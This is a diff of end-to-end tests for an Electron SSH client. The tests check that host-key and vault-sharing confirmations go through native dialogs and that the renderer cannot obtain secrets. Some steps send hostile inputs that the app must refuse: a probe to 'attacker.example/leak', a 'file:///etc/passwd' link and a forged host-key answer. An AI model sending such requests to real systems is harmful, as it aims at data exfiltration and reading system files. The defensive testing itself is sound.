@@ -17,6 +17,7 @@ import {
   startSshTarget,
   startTernixServer,
 } from './support/servers.js';
+import { answerDialog, askedDialogs, stubDialogs } from './support/dialogs.js';
 
 const ARTIFACTS = resolve(import.meta.dirname, 'artifacts');
 const EXECUTABLE = process.env['TERNIX_E2E_EXECUTABLE'];
@@ -63,6 +64,7 @@ async function launch(userData: string): Promise<{ app: ElectronApplication; pag
   for (const stream of [app.process().stdout, app.process().stderr]) {
     stream?.on('data', (chunk: Buffer) => mainLogs.push(chunk.toString()));
   }
+  await stubDialogs(app);
   const page = await app.firstWindow();
   page.on('console', (message) => {
     if (message.type() === 'error') consoleErrors.push(message.text());
@@ -136,15 +138,38 @@ async function typeInTerminal(page: Page, text: string) {
 const pinBadge = (scope: Locator, text: string) =>
   scope.locator('.badge').filter({ hasText: new RegExp(`^${text}$`) });
 
-/** Look a person up on the Sharing page, confirm their fingerprint and add them. */
-async function addMemberViaUi(page: Page, email: string) {
+/** Look a person up on the Sharing page, confirm their fingerprint in main's dialog, add them. */
+async function addMemberViaUi(app: ElectronApplication, page: Page, email: string) {
   await page.getByLabel('Email of the person to add').fill(email);
   await page.getByRole('button', { name: 'Look up' }).click();
-  await expect(page.locator('.card .fingerprint')).toBeVisible();
-  await page.getByRole('checkbox', { name: /checked this fingerprint/ }).check();
+  const fingerprint = ((await page.locator('.card .fingerprint').textContent()) ?? '').trim();
   await page.getByRole('button', { name: 'Add to vault' }).click();
+  const asked = await answerDialog(app, 'Share vault', 'It matches, share');
+  expect(asked.message).toContain(email);
+  expect(asked.detail).toContain(fingerprint);
   await expect(page.getByTestId(`member-${email}`)).toBeVisible();
 }
+
+/** Text of the page and the values of its form fields, as an attacker in the renderer sees it. */
+const pageText = (page: Page) =>
+  page.evaluate(() =>
+    [
+      document.body.innerText,
+      ...[...document.querySelectorAll('input, textarea')].map(
+        (el) => (el as HTMLInputElement | HTMLTextAreaElement).value,
+      ),
+    ].join('\n'),
+  );
+
+/** Call main the way the renderer (or code injected into it) can. */
+const invoke = (page: Page, method: string, arg?: unknown) =>
+  page.evaluate(
+    ([m, a]) =>
+      (
+        window as unknown as { ternix: { invoke(m: string, a?: unknown): Promise<unknown> } }
+      ).ternix.invoke(m as string, a),
+    [method, arg] as const,
+  );
 
 const nav = (page: Page, name: RegExp | string) =>
   page.locator('nav.sidebar').getByRole('button', { name });
@@ -190,23 +215,17 @@ test('packaged app: setup, register, host, host key, terminal, forwards, snippet
   });
 
   await test.step('main rejects malformed requests', async () => {
-    const invoke = (method: string, arg?: unknown) =>
-      page.evaluate(
-        ([m, a]) =>
-          (
-            window as unknown as { ternix: { invoke(m: string, a?: unknown): Promise<unknown> } }
-          ).ternix.invoke(m as string, a),
-        [method, arg] as const,
-      );
-    expect(await invoke('vaults.rename', { vaultId: 'not-a-uuid', name: 'x' })).toMatchObject({
+    expect(await invoke(page, 'vaults.rename', { vaultId: 'not-a-uuid', name: 'x' })).toMatchObject(
+      {
+        ok: false,
+        error: { code: 'invalid_input' },
+      },
+    );
+    expect(await invoke(page, 'no.such.method')).toMatchObject({
       ok: false,
       error: { code: 'invalid_input' },
     });
-    expect(await invoke('no.such.method')).toMatchObject({
-      ok: false,
-      error: { code: 'invalid_input' },
-    });
-    expect(await invoke('shell.openLink', { url: 'file:///etc/passwd' })).toMatchObject({
+    expect(await invoke(page, 'shell.openLink', { url: 'file:///etc/passwd' })).toMatchObject({
       ok: false,
       error: { code: 'invalid_input' },
     });
@@ -248,13 +267,30 @@ test('packaged app: setup, register, host, host key, terminal, forwards, snippet
     await nav(page, /^Hosts/).click();
   });
 
-  await test.step('connect and verify the unknown host key', async () => {
+  await test.step('the renderer gets no secrets and cannot probe other servers', async () => {
+    const all = await invoke(page, 'items.all');
+    expect(all).toMatchObject({ ok: true });
+    expect(JSON.stringify(all)).not.toContain(target.password);
+    expect(JSON.stringify(all)).toContain('"has_password":true');
+    expect(
+      await invoke(page, 'server.probe', { address: 'https://attacker.example/leak' }),
+    ).toMatchObject({ ok: false, error: { code: 'forbidden' } });
+    expect(
+      await invoke(page, 'ssh.answerHostKey', {
+        promptId: '3f1c9a52-8e6b-4d0a-9b7e-0a1b2c3d4e5f',
+        decision: 'trust',
+      }),
+    ).toMatchObject({ ok: false, error: { code: 'invalid_input' } });
+  });
+
+  await test.step('connect and verify the unknown host key in the native dialog', async () => {
     await page.getByTestId(`host-${HOST_LABEL}`).getByRole('button', { name: 'Connect' }).click();
-    const dialog = page.getByRole('dialog', { name: 'Trust this host?' });
-    await expect(dialog).toBeVisible();
-    if (target.fingerprint) await expect(dialog).toContainText(target.fingerprint);
     await shot(page, '04-host-key');
-    await dialog.getByRole('button', { name: 'Trust and connect' }).click();
+    const asked = await answerDialog(app, 'Trust this host?', 'Trust and connect');
+    expect(asked.message).toContain(`${target.address}:${target.port}`);
+    if (target.fingerprint) expect(asked.detail).toContain(target.fingerprint);
+    expect(asked.buttons[asked.defaultId]).toBe('Cancel');
+    expect(asked.cancelId).toBe(asked.defaultId);
   });
 
   await test.step('run a command and see its output', async () => {
@@ -356,19 +392,22 @@ test('packaged app: setup, register, host, host key, terminal, forwards, snippet
     await expect(banner).toContainText('Session ended');
     await banner.getByRole('button', { name: 'Reconnect' }).click();
 
-    const warning = page.getByRole('dialog', { name: /host key has changed/i });
-    await expect(warning).toBeVisible();
-    await expect(warning).toContainText(oldFingerprint);
-    await expect(warning).toContainText(newFingerprint);
-    await expect(warning.getByRole('button', { name: /Replace stored key/ })).toBeDisabled();
-    await shot(page, '09-host-key-changed');
-    await warning.getByRole('button', { name: 'Disconnect' }).click();
+    const warning = await answerDialog(app, 'Host key changed', 'Disconnect');
+    expect(warning.detail).toContain(oldFingerprint);
+    expect(warning.detail).toContain(newFingerprint);
+    expect(warning.buttons[warning.defaultId]).toBe('Disconnect');
+    expect(warning.checkboxLabel).toMatch(/know why the key changed/);
+    await expect(banner).toContainText('CHANGED');
+
+    // Replace without ticking "I know why" is still a no.
+    await banner.getByRole('button', { name: 'Reconnect' }).click();
+    await answerDialog(app, 'Host key changed', 'Replace stored key and connect');
     await expect(banner).toContainText('CHANGED');
 
     await banner.getByRole('button', { name: 'Reconnect' }).click();
-    await expect(warning).toBeVisible();
-    await warning.getByRole('checkbox').check();
-    await warning.getByRole('button', { name: /Replace stored key/ }).click();
+    await answerDialog(app, 'Host key changed', 'Replace stored key and connect', {
+      checkbox: true,
+    });
     await expectConnected(page);
     await typeInTerminal(page, "echo new''key");
     await expectTerminalLine(page, 'newkey');
@@ -418,6 +457,46 @@ test('packaged app: setup, register, host, host key, terminal, forwards, snippet
     await expectConnected(page);
     await typeInTerminal(page, "echo key''auth");
     await expectTerminalLine(page, 'keyauth');
+  });
+
+  await test.step('locking unmounts editors and drops revealed secrets', async () => {
+    const body = 'LOCKTEST-SECRET-KEY-BODY';
+    await page.getByRole('tab', { name: 'Vaults' }).click();
+    await nav(page, /^Keychain/).click();
+    await page.getByRole('button', { name: 'New SSH key' }).click();
+    await page.getByLabel('Label', { exact: true }).fill('lock-key');
+    await page
+      .getByLabel('Private key')
+      .fill(`-----BEGIN OPENSSH PRIVATE KEY-----\n${body}\n-----END OPENSSH PRIVATE KEY-----`);
+    await page.getByLabel('Passphrase').fill('LOCKTEST-PASSPHRASE');
+    await page.getByRole('button', { name: 'Save' }).click();
+    const row = page.locator('.host-row', { hasText: 'lock-key' });
+    await expect(row).toBeVisible();
+    // Lists carry no secrets: the reopened editor starts empty until "Show".
+    expect(await pageText(page)).not.toContain(body);
+    await row.getByRole('button', { name: 'Edit' }).click();
+    const editor = page.getByRole('dialog', { name: /Edit SSH key/ });
+    await expect(editor.getByLabel('Private key')).toHaveValue('');
+    await editor.getByRole('button', { name: 'Show' }).first().click();
+    await expect(editor.getByLabel('Private key')).toHaveValue(new RegExp(body));
+    await editor.getByLabel('Passphrase').fill('typed-but-not-saved');
+
+    // The editor covers the sidebar, as it would when auto-lock or a screen lock fires.
+    expect(await invoke(page, 'auth.lock')).toMatchObject({ ok: true });
+    await expect(page.getByRole('heading', { name: 'Ternix is locked' })).toBeVisible();
+    await shot(page, '08b-locked-with-editor');
+    const locked = await pageText(page);
+    for (const secret of [body, 'LOCKTEST-PASSPHRASE', 'typed-but-not-saved', target.password]) {
+      expect(locked).not.toContain(secret);
+    }
+    await expect(page.locator('.sidebar')).toHaveCount(0);
+    await expect(page.locator('.terminal-pane')).not.toHaveCount(0);
+
+    await page.getByLabel('Master password').fill(PASSWORD);
+    await page.getByRole('button', { name: 'Unlock' }).click();
+    await expect(page.getByTestId('lock-now')).toBeVisible();
+    await expect(page.getByRole('dialog')).toHaveCount(0);
+    expect(await pageText(page)).not.toContain(body);
   });
 
   await test.step('a new host starts with the default port of its group', async () => {
@@ -477,10 +556,8 @@ test('packaged app: setup, register, host, host key, terminal, forwards, snippet
     await page.getByTestId(`host-${HOST_LABEL}`).getByRole('button', { name: 'Connect' }).click();
     // The key was saved, so there is no host-key prompt this time.
     await expect(page.getByTestId('terminal-tab')).toHaveCount(1);
-    await expect(
-      page.getByRole('dialog', { name: /Trust this host|host key has changed/ }),
-    ).toHaveCount(0);
     await expectTerminalLine(page, /Welcome/);
+    expect(await askedDialogs(app)).toEqual([]);
     await shot(page, '10-after-restart');
   });
 
@@ -516,17 +593,23 @@ test('sharing: fingerprint check, roles, realtime, removal', async () => {
     await expect(a.getByRole('option', { name: /Team/ })).toBeVisible();
   });
 
-  await test.step('she must confirm the fingerprint before adding Bob', async () => {
+  await test.step('she must confirm the fingerprint in main’s dialog before adding Bob', async () => {
     await a.getByLabel('Email of the person to add').fill('bob@example.com');
     await a.getByRole('button', { name: 'Look up' }).click();
     const found = a.locator('.card .fingerprint');
     await expect(found).toBeVisible();
     expect(((await found.textContent()) ?? '').trim()).toBe(bobFingerprint);
-    const add = a.getByRole('button', { name: 'Add to vault' });
-    await expect(add).toBeDisabled();
-    await a.getByRole('checkbox', { name: /checked this fingerprint/ }).check();
     await shot(a, 'share-1-verify');
+    const add = a.getByRole('button', { name: 'Add to vault' });
     await add.click();
+    const declined = await answerDialog(alice.app, 'Share vault', 'Cancel');
+    expect(declined.message).toContain('bob@example.com');
+    expect(declined.detail).toContain(bobFingerprint);
+    expect(declined.buttons[declined.defaultId]).toBe('Cancel');
+    await expect(a.getByTestId('member-bob@example.com')).toHaveCount(0);
+
+    await add.click();
+    await answerDialog(alice.app, 'Share vault', 'It matches, share');
     await expect(a.getByRole('row', { name: /Bob/ })).toContainText('viewer');
     // Alice checked the fingerprint herself, so her device pinned Bob's key as verified.
     const bobRow = a.getByTestId('member-bob@example.com');
@@ -569,14 +652,13 @@ test('sharing: fingerprint check, roles, realtime, removal', async () => {
     await shot(b, 'share-1c-bob-sees-unverified');
 
     await aliceRow.getByRole('button', { name: 'Mark verified' }).click();
-    const dialog = b.getByRole('dialog', { name: /Mark .* key as verified/ });
-    await expect(dialog.locator('.fingerprint')).toHaveText(aliceFingerprint);
-    await shot(b, 'share-1d-mark-verified');
-    await dialog.getByRole('button', { name: 'Cancel' }).click();
+    const asked = await answerDialog(bob.app, 'Mark key as verified', 'Cancel');
+    expect(asked.detail).toContain(aliceFingerprint);
+    expect(asked.message).toContain('alice2@example.com');
     await expect(pinBadge(aliceRow, 'unverified')).toBeVisible();
 
     await aliceRow.getByRole('button', { name: 'Mark verified' }).click();
-    await b.getByRole('dialog').getByRole('button', { name: 'It matches, mark verified' }).click();
+    await answerDialog(bob.app, 'Mark key as verified', 'It matches, mark verified');
     await expect(pinBadge(aliceRow, 'verified')).toBeVisible();
     await expect(pinBadge(aliceRow, 'unverified')).toHaveCount(0);
     await expect(aliceRow.getByRole('button', { name: 'Mark verified' })).toHaveCount(0);
@@ -628,8 +710,8 @@ test('sharing: a substituted member key is refused until the owner verifies it',
     await a.getByLabel('Name').fill('Ops');
     await a.getByRole('button', { name: 'Create', exact: true }).click();
     await expect(a.getByRole('option', { name: /Ops/ })).toBeVisible();
-    await addMemberViaUi(a, 'bob3@example.com');
-    await addMemberViaUi(a, 'carol3@example.com');
+    await addMemberViaUi(alice.app, a, 'bob3@example.com');
+    await addMemberViaUi(alice.app, a, 'carol3@example.com');
     expect(keyVersions()).toEqual([1]);
   });
 
@@ -687,6 +769,14 @@ test('sharing: a substituted member key is refused until the owner verifies it',
     await dialog
       .getByRole('button', { name: 'I verified the new fingerprint with carol3@example.com' })
       .click();
+    // The renderer's dialog only explains; main asks again, natively, before pinning the key.
+    const asked = await answerDialog(
+      alice.app,
+      'Encryption key changed',
+      'I verified the new fingerprint',
+    );
+    expect(asked.message).toContain('carol3@example.com');
+    expect(asked.detail).toContain(evilFingerprint);
     await expect(dialog).toHaveCount(0);
     await expect.poll(keyVersions, { message: 'vault key rotated on the server' }).toEqual([2]);
     const carolRow = a.getByTestId('member-carol3@example.com');
